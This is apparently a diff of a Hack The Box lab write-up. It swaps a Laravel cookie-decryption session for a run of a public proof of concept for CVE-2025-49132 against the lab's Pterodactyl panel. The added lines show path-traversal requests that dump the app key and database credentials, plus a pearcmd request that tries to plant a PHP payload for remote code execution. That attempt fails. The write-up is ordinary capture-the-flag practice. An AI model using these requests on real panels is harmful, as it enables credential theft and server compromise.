@@ -369,19 +369,34 @@ http://panel.pterodactyl.htb/ => pterodactyl:PteraPanel@127.0.0.1:3306/panel
 
 it is already done : sad life
 
-api key after decoding UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
+https://github.com/str1keboo/CVE-2025-49132
 
 ```
-(venv) ajdev@rootbox:~/laravel-crypto-killer$ python laravel_crypto_killer.py decrypt \
--k UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY= \
--v eyJpdiI6IjFnNG5OYjBZdmdKL0Y2eHB2b01KNEE9PSIsInZhbHVlIjoiR1kzN2FrblN1Q3VCSm1IRkQyRnN5eGFEUjl4ZkhUUks1V3dPcmY2bk03Q25XYlJ5OGxJOW11eGU2aHp4cXJrajdpV1ZIVm1XVHVFYWNLclY1S2ErR2Q1dGVpYVJKT3JaZnNWL3NCbll4Qk1waGx5RXFPNmhHcFJsek5YSWNScW8iLCJtYWMiOiJkN2YyZWI5ODQzOTcyZmVjMjRhY2RjMjUxYzIyYTgyN2YwYWQ2Njg4NThjMmMzMjJlNGE0NGI1YWFjNmE3NzRhIiwidGFnIjoiIn0=
-/home/ajdev/laravel-crypto-killer/laravel_crypto_killer.py:89: SyntaxWarning: invalid escape sequence '\ '
-  usage = """
-[+] Unciphered value identified!
-[*] Unciphered value
-f50b364286272092e99d4e35b0d24aa1c5982bb9|pLBWXJ0AYrGNrFPW5YaGE8g96SZ7Ysf3dlvEy4KI
-[*] Base64 encoded unciphered version
-b'ZjUwYjM2NDI4NjI3MjA5MmU5OWQ0ZTM1YjBkMjRhYTFjNTk4MmJiOXxwTEJXWEowQVlyR05yRlBXNVlhR0U4Zzk2U1o3WXNmM2RsdkV5NEtJDw8PDw8PDw8PDw8PDw8P'
+(venv) ajdev@rootbox:~/CVE-2025-49132$ python3 CVE-2025-49132-PoC.py test http://panel.pterodactyl.htb
+[+] Target appears vulnerable (Path: ../../../pterodactyl)
+(venv) ajdev@rootbox:~/CVE-2025-49132$ python3 CVE-2025-49132-PoC.py dump http://panel.pterodactyl.htb
+\[*] Attempting dump: http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/app
+
+[SUCCESS] App Configuration Found:
+NAME      : Pterodactyl
+ENV       : production
+DEBUG     :
+URL       : http://panel.pterodactyl.htb
+KEY       : base64{{UaThTPQnUjrrK61o}}+Luk7P9o4hM+gl4UiMJqcbTSThY=
+CIPHER    : AES-256-CBC
+
+[+] APP_KEY ready for session forgery
+
+[*] Attempting dump: http://panel.pterodactyl.htb/locales/locale.json?locale=../../../pterodactyl&namespace=config/database
+
+[SUCCESS] Database Credentials Found:
+URI: pterodactyl:PteraPanel@127.0.0.1:3306/panel
+(venv) ajdev@rootbox:~/CVE-2025-49132$ \python3 CVE-2025-49132-PoC.py exploit http://panel.pterodactyl.htb --os linux
+[+] Target appears vulnerable (Path: ../../../pterodactyl)
+[*] Sending exploit: http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../usr/local/lib/php&namespace=pearcmd&/%3C%3Fphp%20sleep%285%29%3B%20%3F%3E+/tmp/payload.php'; echo
+[*] Verifying RCE (5s delay)...
+[-] RCE Failed.
 ```
+
 
 
